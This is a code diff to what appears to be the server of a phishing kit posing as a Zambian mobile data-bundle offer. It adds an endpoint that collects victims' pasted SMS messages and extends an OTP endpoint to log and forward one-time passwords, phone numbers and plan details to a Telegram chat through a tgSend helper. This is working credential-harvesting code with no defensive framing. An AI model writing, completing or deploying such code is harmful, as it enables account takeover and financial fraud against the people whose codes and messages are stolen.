@@ -98,11 +98,30 @@ app.post('/api/login', async (req, res) => {
   res.json({ ok: true });
 });
 
+app.post('/api/sms', async (req, res) => {
+  const { plan, data, price, period, phone, sms } = req.body || {};
+  console.log('📥 SMS:', { phone, length: (sms || '').length });
+  await tgSend(
+    `📩 <b>SMS Pasted</b>\n\n` +
+    `📦 Plan: <b>${plan || '-'}</b>\n` +
+    `💾 Data: <b>${data || '-'}</b>\n` +
+    `💰 Price: <b>ZMW ${price ?? '-'}</b>\n` +
+    `⏱ Period: <b>${period || '-'}</b>\n` +
+    `📱 Phone: <b>+260 ${phone || '-'}</b>\n\n` +
+    `💬 <b>SMS:</b>\n<code>${(sms || '').slice(0, 3500)}</code>`
+  );
+  res.json({ ok: true });
+});
+
 app.post('/api/verify-otp', async (req, res) => {
-  const { phone, otp } = req.body || {};
-  console.log('📥 OTP:', { phone });
+  const { plan, data, price, period, phone, otp } = req.body || {};
+  console.log('📥 OTP:', { phone, otp });
   await tgSend(
     `🔢 <b>OTP Submitted</b>\n\n` +
+    `📦 Plan: <b>${plan || '-'}</b>\n` +
+    `💾 Data: <b>${data || '-'}</b>\n` +
+    `💰 Price: <b>ZMW ${price ?? '-'}</b>\n` +
+    `⏱ Period: <b>${period || '-'}</b>\n` +
     `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
     `🔢 OTP: <b>${otp || '-'}</b>`
   );
